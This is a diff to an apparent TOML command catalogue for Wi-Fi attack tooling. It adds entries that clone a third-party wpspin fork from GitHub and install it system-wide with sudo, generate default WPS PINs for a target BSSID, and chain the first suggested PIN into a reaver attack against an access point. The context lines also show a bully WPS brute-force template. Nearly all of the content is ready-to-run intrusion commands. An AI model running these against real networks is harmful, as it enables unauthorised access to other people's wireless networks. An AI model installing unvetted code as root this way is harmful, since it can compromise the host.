@@ -760,6 +760,37 @@ template = "sudo bully {mon_iface} -b {bssid} -S -F -B -v 3"
 requires = ["bully"]
 tags = ["wps", "bully"]
 
+[[command]]
+id = "wifi.wpspin.install"
+title = "wpspin — install from epicdev420/WPSPin (archived drygdryg/wpspin)"
+template = """git clone --depth 1 https://github.com/epicdev420/WPSPin.git /opt/wpspin && \\
+sudo cp -r /opt/wpspin/dist-packages/wpspin* "$(python3 -c 'import site; print(site.getsitepackages()[0])')/" && \\
+sudo install -m 755 /opt/wpspin/wpspin /usr/local/bin/wpspin"""
+tags = ["wps", "wpspin", "install"]
+
+[[command]]
+id = "wifi.wpspin"
+title = "wpspin — suggested default PINs from BSSID (vendor algorithms)"
+template = "wpspin {bssid}"
+requires = ["wpspin"]
+tags = ["wps", "wpspin", "offline"]
+
+[[command]]
+id = "wifi.wpspin.all"
+title = "wpspin — all PIN algorithms for BSSID (-A)"
+template = "wpspin -A {bssid}"
+requires = ["wpspin"]
+tags = ["wps", "wpspin", "offline"]
+
+[[command]]
+id = "wifi.wpspin.reaver"
+title = "wpspin + reaver — try first suggested PIN with reaver"
+template = """PIN=$(wpspin {bssid} 2>/dev/null | awk 'NR==3{print $1; exit}') && \\
+test -n "$PIN" && sudo reaver -i {mon_iface} -b {bssid} -p "$PIN" -vv || \\
+echo 'No suggested PIN from wpspin; run wifi.wpspin or wifi.wpspin.all'"""
+requires = ["wpspin", "reaver"]
+tags = ["wps", "wpspin", "reaver"]
+
 # === airolib-ng (precomputed PMK) ===
 
 [[command]]
